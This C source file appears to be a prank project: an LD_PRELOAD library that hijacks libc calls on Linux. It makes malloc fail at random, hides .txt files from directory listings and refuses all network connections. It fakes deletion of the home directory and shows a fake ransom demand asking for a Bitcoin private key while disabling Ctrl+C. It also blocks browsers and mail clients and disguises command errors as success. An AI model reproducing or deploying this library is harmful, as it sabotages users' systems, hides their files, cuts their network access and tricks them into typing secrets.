#define _GNU_SOURCE
#define LAYOUT_FILE "/tmp/layout_phase.log" //for getchar // for execve
#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <dlfcn.h>
#include <string.h>
#include <time.h>
#include <signal.h>
#include <fcntl.h>
#include <stdarg.h> // for va_list
#include <errno.h>
#include <libgen.h>
#include <limits.h>
#include <sys/types.h> // For PATH_MAX, // for mode_t
#include <sys/socket.h> // for connect
#include <sys/stat.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <math.h>
#include <pwd.h>
#include <termios.h> // for exit cleanup
#include <stdbool.h> // for bool 
#include <dirent.h>
#include <ctype.h> //for write


typedef struct dirent* (*orig_readdir_f_type)(DIR *);
typedef struct dirent64* (*orig_readdir64_f_type)(DIR *);
typedef int (*orig_execve_f_type)(const char*, char*const[], char*const[]);

static void* (*original_malloc)(size_t) = NULL;
ssize_t (*original_read)(int fd, void *buf, size_t count) = NULL;
ssize_t (*original_write)(int fd, const void *buf, size_t count) = NULL;
int (*original_open)(const char *pathname, int flags, ...) = NULL;
static int (*connect_connect)(int, const struct sockaddr *, socklen_t) = NULL;
int (*original_getchar)(void) = NULL;

static int block_count = 0; // Global counter for blocked connections


// ####### MALLOC Random #######
// Will randomly return Null 
//
// topLimit defines the limit on how big the random generated number can be which defines 
// the crash conditions  
long get_random_uint() {  // calculates random number
    long r;
    long fd = open("/dev/urandom", O_RDONLY);
    if (fd >= 0) {
        if (read(fd, &r, sizeof(r)) < 0) {
            r = 42; //fallback value
        }
        close(fd);
    } else {
        r = 42; // fallback value
    }

    if (r < 0) {
        r = r * (-1);
    }

    r = r/1000;
    return r;  // always >= 0
}

static void mtrace_init(void) {
    original_malloc = dlsym(RTLD_NEXT, "malloc"); //calls original malloc
    if (NULL == original_malloc) { //error if original malloc couldnt be called
    }
}

void *malloc(size_t size) {
    long random;
    long topLimit=60000000;

    if(original_malloc==NULL) { //if original malloc doesnt exist call it
        mtrace_init();
    }

    pid_t pid = getpid();
    char exe_path[512];
    snprintf(exe_path, sizeof(exe_path), "/proc/%d/exe", pid);
    char exe[512];
    ssize_t len = readlink(exe_path, exe, sizeof(exe) - 1);
    if (len != -1) {
        exe[len] = '\0';
        const char *base = strrchr(exe, '/');
    if (base) {
        base = base + 1;
    } else {
        base = exe;
    }
        if (strcmp(base, "bash") == 0 || strcmp(base, "less") == 0 || strcmp(base, "cat") == 0 || strcmp(base, "nano") == 0 || strcmp(base, "head") == 0 || strcmp(base, "man") == 0 || strcmp(base, "gedit") == 0) {
            return original_malloc(size); // Avoid collision with read() 
        }
    }

    random = get_random_uint(); //generater random number
    random = random % topLimit; // top limit how big random can be, sweet spot for gnome-waether

    void *p = NULL;
    p = original_malloc(size); //find free space

    if (size > random ){
        return NULL; 
    }
    return p;
}


//####### READ #######
// Hijack of the read() function. Simulates deletion with cat, less, chown or chmod. Simulates remote access with install and apt-get.
void restore_terminal() { //function needed to stop freezing the terminal after the _exit(0) command
    struct termios terminal;
    FILE *input_stream = stdin;
    int input_fd = fileno(input_stream);
    int result = tcgetattr(input_fd, &terminal); // get terminal settings
    if (result != 0) {
        return; // do nothing when no settings 
    }
    
    terminal.c_lflag = terminal.c_lflag | ICANON; // turn on input buffer until enter
    terminal.c_lflag = terminal.c_lflag | ECHO; // turn on echo to show typed letters on screen
    tcsetattr(input_fd, TCSANOW, &terminal); // set terminal to those settings
}

void remote_access() {
    fprintf(stderr, "\033[?25l");  // Hide cursor to look more realistic 
    fprintf(stderr, "Remote access detected from IP 192.168.1.115\n"); // just a random IP nr
    sleep(1);
    fprintf(stderr, "Downloading spy software\n");

    const int width = 30;
    for (int i = 0; i <= width; ++i) {
        fprintf(stderr, "\r\033[32m[");
        for (int j = 0; j < width; ++j) {
            if (j <= i)
                fprintf(stderr, "#"); // symbol for the progress bar
            else
                fprintf(stderr, " "); // rest is space
        }

        fprintf(stderr, "]\033[0m %d%%", (i * 100) / width); // additionally show how many percent donwloaded already
        fflush(stderr); //guarantee print before next operation
        usleep(150000); 
    }

    sleep(1);
    fprintf(stderr, "\nYour system is being observed. We want 1 Bitcoin to revert this.");
    sleep(1);
    fprintf(stderr, "\nEnter your wallet's private key here:\n");
    fprintf(stderr, "\033[?25h");  // Show cursor again for input
    char key[128]; // e.g E9873D79C6D87DC0FB6A5778633389F4453213303DA61F20BD67FC233DORIKTF 
    if (fgets(key, sizeof(key), stdin)) { // input gets taken
    size_t len = strlen(key);
    if (len > 0 && key[len - 1] == '\n') { // remove the newline for correct length
        len--;
    } 

    if (len == 64) { // because a bitcoin private key is a 64 char long string of letters and numbers
        fprintf(stderr, "\033[33mThank you. You will hear from us.\033[0m\n"); // length matches
    } else {
        fprintf(stderr, "\033[31mAre you really trying to trick us? This is an invalid key. We will publish all your private information.\033[0m\n");
    }
    sleep(2);
   } 
}

void deletion_simulation(const char *home) {
    char *fake_files[] = {"/Documents", "/Desktop", "/Public", "/snap", "/Downloads", "/.ssh", "/.cache", "/.local", "/.thunderbird", "/Projects", "/Videos"}; // simulates the deletion of all personal files
    for (int i = 0; i < 11; ++i) {
        fprintf(stderr, "deleted %s%s\n", home, fake_files[i]);
        usleep(300000 + rand() % 200000); //random sleep time because different sizes lead to different delete times
    }
}

// hijacks the read() system call
ssize_t read(int fd, void *buf, size_t count) {
    if (!original_read) {
        original_read = dlsym(RTLD_NEXT, "read");
    }
    
    if (getenv("ALREADY_DONE")) {
    return original_read(fd, buf, count); // don't do hijack
    }

    static int deletion_triggered = 0;
    static int done = 0;
    static int remote_triggered = 0;

    if (done) {
        return 0;  
    }

    char exe[512];
    ssize_t len = readlink("/proc/self/exe", exe, sizeof(exe) - 1);
    if (len != -1 && len < sizeof(exe)) {
        exe[len] = '\0';
        char *name = basename(exe); // extract the used command

        if (!deletion_triggered) {
            deletion_triggered = 1; // avoid showing same outputs multiple times 
            signal(SIGINT, SIG_IGN); // ignore Ctrl+C
            
            char parent_exe[256]; // extract the command that called the one above
            char linkpath[64];
            snprintf(linkpath, sizeof(linkpath), "/proc/%d/exe", getppid());
            ssize_t len = readlink(linkpath, parent_exe, sizeof(parent_exe) - 1);
            if (len != -1) {
                parent_exe[len] = '\0';
                if (strstr(name, "less") && strstr(parent_exe, "/man")) { // man calls then less: have to avoid this function here called when we want to call the write function
                    return original_read(fd, buf, count);
                }
            }
		
	// The commands chmod and chown are chosen because they modify permissions /usership, therefore an access is fitting. Additionally the cat and less function because they are used more often.
            if ((strstr(name, "chmod") || strstr(name, "chown") || strstr(name, "cat") || strstr(name, "less")) && !strstr(name, "man")) {
                fprintf(stderr, "\033[?25l");  // hide cursor to look more realistic 
                fprintf(stderr, "\033[31mALERT: Unauthorized access detected\n");
                sleep(2);
                const char *home = getenv("HOME"); // personalize to user
                if (!home) home = "/home/user"; // if no user is found take a default
                deletion_simulation(home);
                fprintf(stderr, "IRREVERSIBLE DELETION COMPLETE\n");
                sleep(3);
                fprintf(stderr, "Enjoy the rest of your day :)");
                sleep(3);
                fprintf(stderr, "\n");
                signal(SIGINT, SIG_DFL); // Reset Ctrl+C
                fprintf(stderr, "\033[?25h");  // Show cursor again
                done = 1; // to not show the same output again
                restore_terminal();
                _exit(0); // to stop immediately w/o displaying additional things from the command
            }  
        }
    
        if (!remote_triggered) {
            remote_triggered = 1;

            // This hijack for the "install" and "get-apt" command. install and apt-get are used for downloading, so a fake download of spy software is fitting
            if (strstr(name, "install") || strstr(name, "apt-get")) {
                signal(SIGINT, SIG_IGN);  // disable Control+C for more panic
                remote_access();
                signal(SIGINT, SIG_DFL); // make Control+C work again
                restore_terminal();
                _exit(0); 
            }  
        }
    
        // needed here to hijack in execve
        if (strstr(name, "gedit")) {
            fprintf(stderr, "Execute this command using the bash command\n"); // otherwise the gedit hijack is not enabled 
                restore_terminal();
                _exit(0);
        }
	}
    return original_read(fd, buf, count); // execute the real if no hijack fitting
}


// ####### OPEN #######
//recommended to use with the commands cp, head, nano, cat. 
// Affects the files secrets.txt, openThis.txt, preloadLib
int open(const char *pathname, int flags, ...) {
    if (!original_open) {
        original_open = dlsym(RTLD_NEXT, "open");
        if (!original_open) {
            fprintf(stderr, "Error: unable to load original open function\n");
            return -1;
        }
    }

    if (strstr(pathname, "preloadLib")) { // no one allowed to change this library
        errno = EACCES; // Permission denied
        return -1;
    }

    if (strstr(pathname, "secrets.txt")) { // no one allowed to read our secrets
        char *path_copy = strdup(pathname); 
        char *dir = dirname(path_copy); // get the directory where secrets file is located

        char fake_path[PATH_MAX];
        snprintf(fake_path, sizeof(fake_path), "%s/stillASecret.txt", dir); // new path in the same directory
        free(path_copy);

        FILE *newfile = fopen(fake_path, "w"); //creating new file where user will write into instead of secrets.txt
        if (newfile) {
            fprintf(newfile, "you should not be so curious\n"); // write into newly created file
            fclose(newfile);
        } else {
            fprintf(stderr, "Error: could not create %s\n", fake_path);
            return -1;
        }

        return original_open(fake_path, flags); // original function called but with manipulated path
    }

    if (strstr(pathname, "openThis.txt")) { // a trap for users
        fprintf(stderr, "You have been hacked. Don't do everything you're told\n");
        restore_terminal();
        _exit(0); // can't open, stop 
    }

    va_list args; // for when arguments are given when opening a new file
    va_start(args, flags);
    int result;
    if (flags & O_CREAT) {
        int mode = va_arg(args, int);
        result = original_open(pathname, flags, mode);
    } else {
        result = original_open(pathname, flags);
    }
    va_end(args);
    return result;
}


// ####### WRITE #######
//hijacks the output of invalid commands. Reverts the output of "whoami"
// shows the man pages in rainbow colors
const char* get_real_username() { //helper function for "whoami"
    static char username[256] = {0};
    if (username[0] == '\0') {
        struct passwd *pw = getpwuid(geteuid());
        if (pw) {
            strncpy(username, pw->pw_name, sizeof(username) - 1);
        }
    }
    return username;
}

const char *colors[] = { // Rainbow colored
    "\033[35m", // magenta
    "\033[31m", // red
    "\033[33m", // yellow
    "\033[32m", // green
    "\033[36m", // cyan
    "\033[34m", // blue
};
const int num_colors = sizeof(colors) / sizeof(colors[0]);
const char *color_reset = "\033[0m"; //normal again

// helper function goes over all characters to not color binary output
bool is_printable_text(const char *data, size_t len) {
    int printable = 0;
    for (size_t i = 0; i < len; ++i) {
        if (isprint(data[i]) || data[i] == '\n' || data[i] == '\t') {
            printable++;
        }
    }
    return (printable > 0.9 * len); 
}

// Build rainbow-colored line
char *rainbow_text(const char *line, size_t len, size_t *out_len) {
    size_t buf_size = len * 16 + strlen(color_reset) + 1; // big buffer because of all the color codes
    char *out = malloc(buf_size);
    if (!out) return NULL;

    size_t i = 0, j = 0, color_idx = 0; 

    while (i < len) {
        if (line[i] == '\033' && i + 1 < len && line[i + 1] == '[') {
            size_t esc_start = i;
            i += 2; // Skip "\033["

            while (i < len && !(line[i] >= 'a' && line[i] <= 'z') && !(line[i] >= 'A' && line[i] <= 'Z')) {
                i++;
            }
            if (i < len) i++; 

            size_t esc_len = i - esc_start;
            memcpy(out + j, line + esc_start, esc_len);
            j += esc_len;
        } else { // for all normal characters change to a color, go through all colors
            const char *color = colors[color_idx % num_colors];
            size_t c_len = strlen(color);
            memcpy(out + j, color, c_len);
            j += c_len;
            out[j++] = line[i++];
            color_idx++;
        }
    }

    memcpy(out + j, color_reset, strlen(color_reset));
    j += strlen(color_reset);
    out[j] = '\0';
    *out_len = j;
    return out;
}

// write: in case of command not found print successful
ssize_t write(int fd, const void *buf, size_t count) {
    if (!original_write) {
        original_write = dlsym(RTLD_NEXT, "write");
    }
    
    if (getenv("DISABLE_WRITE_PRANK")) { // needed for connect function
        return original_write(fd, buf, count);
    }
    
	if (!isatty(fd) || count == 0 || buf == NULL) { //apply only on terminal outputs
        return original_write(fd, buf, count);
    }

    const char *text = (const char *)buf;
    if (!is_printable_text(text, count)) {
        return original_write(fd, buf, count);
    }

    char *msg = strndup(buf, count); // copy buffer 
    if (!msg) return original_write(fd, buf, count);

    // replace "Command not found" warning
    if ((strstr(msg, "Command") && strstr(msg, "not found")) || strstr(msg, "Could not find command-not-found")) {
        const char *success_msg = "Finished execution: no errors\n";
        original_write(fd, success_msg, strlen(success_msg));
        free(msg);
        exit(0);
    }
    
    // detect the man commands, these word always appear there
    if (strstr(text, "usage") || strstr(text, "DO NOT MODIFY THIS FILE!") || strstr(text, "Manual page") || strstr(text, "--help")) {
        const char *start = text;
        const char *end = text + count;
        ssize_t total_written = 0;

        while (start < end) {
            const char *newline = memchr(start, '\n', end - start);
            size_t line_len = newline ? (newline - start + 1) : (end - start);

            size_t rainbow_len;
            char *rainbow = rainbow_text(start, line_len, &rainbow_len);
            if (rainbow) {
                total_written += original_write(fd, rainbow, rainbow_len);
                free(rainbow);
            } else {
                total_written += original_write(fd, start, line_len);
            }

            start += line_len;
        }

        return total_written;
    }
    ssize_t result = original_write(fd, msg, count);
    free(msg);
    return result;
}

int puts(const char *s) { // because "whoami" doesn't call write directly
    static int (*real_puts)(const char *) = NULL;
    if (!real_puts) {
        real_puts = dlsym(RTLD_NEXT, "puts");
    }

    const char *username = get_real_username();
    if (username && strstr(s, username)) {
        char reversed[256];
        size_t len = strnlen(username, sizeof(reversed) - 1);
        for (size_t i = 0; i < len; ++i) {
            reversed[i] = username[len - i - 1]; //reversing the username 
        }
        reversed[len] = '\0';
        return real_puts(reversed);
    }

    return real_puts(s);
}

int access(const char *pathname, int mode) { // pretending command-not-found doesn't exist
    static int (*orig_access)(const char *, int) = NULL;
    if (!orig_access) {
        orig_access = dlsym(RTLD_NEXT, "access");
    }

    if (strstr(pathname, "command-not-found")) {
        errno = ENOENT; // "No such file or directory"
        return -1;
    }

    return orig_access(pathname, mode);
}


///####### CONNECT #######
// Override connect() to selectively block certain ports and all other IP connections
int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen) {
    static int (*original_connect)(int, const struct sockaddr *, socklen_t) = NULL;
    if (!original_connect) {
        original_connect = dlsym(RTLD_NEXT, "connect");
    }

    int port = -1; // to block the ports
    char ip[INET6_ADDRSTRLEN] = "unknown";

    if (addr->sa_family == AF_INET) {
        struct sockaddr_in *addr_in = (struct sockaddr_in *)addr; // for IPv4 addresses
        port = ntohs(addr_in->sin_port);
        inet_ntop(AF_INET, &addr_in->sin_addr, ip, sizeof(ip)); 
    } else if (addr->sa_family == AF_INET6) {
        struct sockaddr_in6 *addr_in6 = (struct sockaddr_in6 *)addr; //for IPv6 addresses
        port = ntohs(addr_in6->sin6_port);
        inet_ntop(AF_INET6, &addr_in6->sin6_addr, ip, sizeof(ip));
    } else {
        printf("[INTERNET_ACCESS_BLOCKED] Unknown address family (%d)\n", addr->sa_family); // error message for display
        return original_connect(sockfd, addr, addrlen);
    }

    int blocked_ports[] = {6667, 6697, 993}; // blocked ports for apps
    int should_block = 0;

    for (int i = 0; i < sizeof(blocked_ports) / sizeof(blocked_ports[0]); i++) {
        if (port == blocked_ports[i]) {
            should_block = 1;
            break;
        }
    }

    if (should_block) { // different log files for app related blocking (blocked2) and IPv4/6 related blocking (blocked)
        block_count++;
        printf("[INTERNET_ACCESS_BLOCKED] Blocking connection to %s:%d\n", ip, port);
        printf("[INTERNET_ACCESS_BLOCKED] Total blocked: %d\n", block_count);

        FILE *logfile2 = fopen("/tmp/blocked2.log", "a");
        if (logfile2) {
            fprintf(logfile2, "Blocked connection to %s:%d (family %d)\n", ip, port, addr->sa_family);
            fclose(logfile2);
        }

        errno = ECONNREFUSED;
        return -1;
    } else {
        block_count++;
        printf("[INTERNET_ACCESS_BLOCKED] Blocking connection to %s:%d (other connection)\n", ip, port);
        printf("[INTERNET_ACCESS_BLOCKED] Total blocked: %d\n", block_count);

        FILE *logfile = fopen("/tmp/blocked.log", "a");
        if (logfile) {
            if (addr->sa_family == AF_INET) {
                fprintf(logfile, "Blocked IPv4 connection to %s:%d\n", ip, port);
            } else if (addr->sa_family == AF_INET6) {
                fprintf(logfile, "Blocked IPv6 connection to [%s]:%d\n", ip, port);
            }
            fclose(logfile);
        }

        errno = ECONNREFUSED;
        return -1;
    }
}


//####### READDIR #######
// Hijack ls command to not show .txt files, file hiding
static int ends_with_txt(const char *str) { // for identifying .txt files
    if (!str) return 0;
    size_t len = strlen(str);
    if (len < 4) return 0;
    return strcmp(str + len - 4, ".txt") == 0;
}

// Hook readdir to skip .txt files
struct dirent *readdir(DIR *dirp) {
    static orig_readdir_f_type orig_readdir = NULL;
    if (!orig_readdir) {
        orig_readdir = (orig_readdir_f_type)dlsym(RTLD_NEXT, "readdir");
    }

    struct dirent *entry;
    while ((entry = orig_readdir(dirp)) != NULL) {
        if (ends_with_txt(entry->d_name)) {
            // skip this entry with continue
            continue;
        }
        return entry;
    }
    return NULL;
}

// Hook readdir64 similarly (must also be blocked in addition to readdir because of different versions)
struct dirent64 *readdir64(DIR *dirp) {
    static orig_readdir64_f_type orig_readdir64 = NULL;
    if (!orig_readdir64) {
        orig_readdir64 = (orig_readdir64_f_type)dlsym(RTLD_NEXT, "readdir64");
    }

    struct dirent64 *entry;
    while ((entry = orig_readdir64(dirp)) != NULL) {
        if (ends_with_txt(entry->d_name)) {
            // skip again
            continue;
        }
        return entry;
    }
    return NULL;
}


// ####### GETCHAR #######
// in combination with the execve() hijack, turns KCapp into a time/layout based riddle where Firefox and Thunderbird Mail can't be used.
static int (*real_getchar)(void) = NULL;

const char *PHYSICAL_KEYS  = "qwertzuiopasdfghjklyxcvbnm";
const char *DEFAULT_LAYOUT = "qwertzuiopasdfghjklyxcvbnm";

// Helper function to find first hint
void build_abc_layout(char *out) {
    strcpy(out, "abcdefghijklmnopqrstuvwxyz"); //  mnbvcxy spells f i r e f o x in the Alphabetical layout
    // mnbvcxy -> firefox
    const char *phys = PHYSICAL_KEYS;
    const char *special = "mnbvcxy";
    const char *firefox = "firefox";
    for (int i = 0; i < 7; ++i) {
        char *p = strchr(phys, special[i]);
        if (p)
            out[p - phys] = firefox[i];
    }
}

// Helper function to find first hint
void build_zyx_layout(char *out) {
    strcpy(out, "zyxwvutsrqponmlkjihgfedcba"); // //  poiuztasdf spells t h u n d e r b i r d in the reverse Alphabetical layout
    const char *phys = PHYSICAL_KEYS;
    // poiuztrasdf -> thunderbird
    const char *pmap = "poiuztrasdf";
    const char *thunderbird = "thunderbird";
    for (int i = 0; i < 11; ++i) {
        char *p = strchr(phys, pmap[i]);
        if (p)
            out[p - phys] = thunderbird[i];
    }
}

// QWERTZ=1s, ABC=10s, ZYX=10s
int get_phase(time_t start_time) { // Three phases exist which ultimatelly decide how effective, the given hints are
    time_t now = time(NULL);
    int period = 21; // total time for one cycle.
    int t = (now - start_time) % period;
    if (t == 0) return 0;         // The standard layout will be displayed for 1 second, enough time to close the program
    else if (t >= 1 && t <= 10) return 1; // Alphabetical lasts 10 seconds, which is enough time to solve for the hint 
    else return 2;                // Reverse Alphabetical lasts 10 seconds, which is short enough to confuse the user
}
// logic for "communication" between getchar() and execve().
int getchar(void) {
    if (!real_getchar)
        real_getchar = dlsym(RTLD_NEXT, "getchar");

    static time_t start_time = 0;
    if (start_time == 0)
        start_time = time(NULL);

    int phase = get_phase(start_time);

    // write the current phase into the log file
    FILE *f = fopen(LAYOUT_FILE, "w");
    if (f) {
        fprintf(f, "%d", phase);
        fclose(f);
    }
// To let the user know on what he has to do / introduction after the hijack starts. ONLY DISPLAYED DURING HIJACK
    char current_layout[28];
    const char *layout_name = "You need to hit the right Keys to know what is going on. --> Three rows merged as one... the keys, not the code <--";
    if (phase == 1) {
        build_abc_layout(current_layout);
        layout_name = "ABC.. IS THE CURRENT LAYOUT. (mnbvcxy -> firefox)";
    } else if (phase == 2) {
        build_zyx_layout(current_layout);
        layout_name = "ZYX.. IS THE CURRENT LAYOUT. (poiuztr -> ? + asdf -> bird)";
    } else {
        strcpy(current_layout, DEFAULT_LAYOUT);
    }
    static int last_phase = -1;
    if (phase != last_phase) {
        fprintf(stderr, "\n\033[1;33m[--> %s]\033[0m\n> ", layout_name);
        fflush(stderr);
        last_phase = phase;
    }

    int c = real_getchar();
    if (c == EOF) return EOF;

    if (isalpha(c)) {
        char lower_c = tolower(c);
        char *key_ptr = strchr(PHYSICAL_KEYS, lower_c);
        if (key_ptr) {
            int key_index = key_ptr - PHYSICAL_KEYS;
            char mapped = current_layout[key_index];
            return isupper(c) ? toupper(mapped) : mapped;
        }
    }

    return c;
}


// ####### EXECVE #######
int execve(const char *pathname, char *const argv[], char *const envp[]) {
    // ### BLOCK PART ###
    int phase = 0;
    FILE *f = fopen(LAYOUT_FILE, "r");
    if (f) {
        fscanf(f, "%d", &phase);
        fclose(f);
    }
	
    // Decide what to block based on phase
    int block = 0;
    if (phase == 1 && strstr(pathname, "firefox")) {
        block = 1;
        fprintf(stderr, "\n\033[1;31m[BLOCKED] Solve the riddle in KCapp to launch Firefox!\033[0m\n");
    }
    if (phase == 2 && strstr(pathname, "thunderbird")) {
        block = 1;
        fprintf(stderr, "\n\033[1;31m[BLOCKED] Solve the riddle in KCapp to launch Thunderbird Mail!\033[0m\n");
    }

    if (block) {
        errno = EACCES; // deny permission
        return -1;
    }

    orig_execve_f_type orig_execve;
    orig_execve = (orig_execve_f_type)dlsym(RTLD_NEXT, "execve");

    
    
    // ### GEDIT PART ####
    // works similar to open, for when files want to be opened with the GUI using gedit
    
    //to prevent doing it multiple times
    if (getenv("ALREADY_DONE")) {
        return orig_execve(pathname, argv, envp);
    }

    if (strstr(pathname, "gedit")) { // for gui text-editor with gedit
        int i = 0;
        char **new_argv = NULL;
        int hijack_needed = 0;

        while (argv[i] != NULL) {
            i++;
        }
        new_argv = malloc((i + 1) * sizeof(char *)); // memory for new arguments, size as before but one more for NULL pointer
        for (int j = 0; j < i; ++j) { //go through all the arguments
            if (strstr(argv[j], "openThis.txt")) { // from here on same logic as in open
                fprintf(stderr, "You have been hacked. Don't do everything you're told\n");
                exit(1);
            } else if (strstr(argv[j], "preloadLib.c")) {
                fprintf(stderr, "Permission denied\n");
                exit(126);
            } else if (strstr(argv[j], "secrets.txt")) { // al the file creation steps nearly same as in open
                char *path_copy = strdup(argv[j]); // for fake file
                char *dir = dirname(path_copy);

                char fake_path[PATH_MAX];
                snprintf(fake_path, sizeof(fake_path), "%s/stillASecret.txt", dir);
                free(path_copy);

                FILE *newfile = fopen(fake_path, "w"); 
                if (newfile) {
                    fprintf(newfile, "you should not be so curious\n");
                    fclose(newfile);
                } else {
                    fprintf(stderr, "Error: could not create %s\n", fake_path);
                    return -1;
                }

                new_argv[j] = strdup(fake_path); // replace argument with fake path
                hijack_needed = 1;
            } else {
                new_argv[j] = argv[j];  // nothing has to be changed
            }
        }
        new_argv[i] = NULL;  // null-terminate

        if (hijack_needed) { // an argument was changed
            int counter = 0;
            while (envp[counter] != NULL) {
                counter++;
            }
            char **new_envp = malloc((counter + 2) * sizeof(char *));
            for (int j = 0; j < counter; ++j) new_envp[j] = envp[j];
            new_envp[counter] = "ALREADY_DONE=1";
            new_envp[counter + 1] = NULL;

            return orig_execve(pathname, new_argv, new_envp);
        }

        free(new_argv); // no hijack was needed
    }

    // If the program was not gedit / no hijack happened
    int counter = 0;
    while (envp[counter] != NULL) {
        counter++;
    }
    char **new_envp = malloc((counter + 2) * sizeof(char *));
    for (int i = 0; i < counter; ++i) {
        new_envp[i] = envp[i];
    }
    new_envp[counter] = "ALREADY_DONE=1";
    new_envp[counter + 1] = NULL;

    return orig_execve(pathname, argv, envp);
}
